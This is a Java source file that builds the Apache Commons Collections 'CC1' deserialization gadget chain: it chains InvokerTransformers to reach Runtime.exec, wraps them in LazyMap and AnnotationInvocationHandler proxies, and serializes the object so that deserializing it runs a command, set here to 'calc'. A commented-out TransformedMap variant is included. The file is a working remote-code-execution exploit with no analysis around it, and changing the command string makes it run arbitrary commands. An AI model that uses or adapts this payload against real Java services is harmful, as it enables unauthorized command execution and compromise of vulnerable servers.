package exp;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import static tools.Decode.unserializeBase64Decode;
import static tools.Encode.serializeBase64Encode;

public class CC1 {
    public static void main(String[] args) throws Exception{
        String command = "calc";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{command})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

/// ==========================================TransformedMap版==========================================
//        HashMap<Object,Object> map = new HashMap<>();
//        map.put("value","value");
//        Map decorator = TransformedMap.decorate(map,null,chainedTransformer);
//        Class annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
//        annotationInvocationHandlerConstructor.setAccessible(true);
//        Object annotationInvocationHandler = annotationInvocationHandlerConstructor.newInstance(Target.class,decorator);
/// ==========================================TransformedMap版==========================================

/// =============================================LazyMap版=============================================
        HashMap<Object,Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class,lazyMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},invocationHandler);
        Object annotationInvocationHandler = annotationInvocationHandlerConstructor.newInstance(Target.class,mapProxy);
/// =============================================LazyMap版=============================================

        serializeBase64Encode(annotationInvocationHandler);
        unserializeBase64Decode("ser.bin");
    }
}
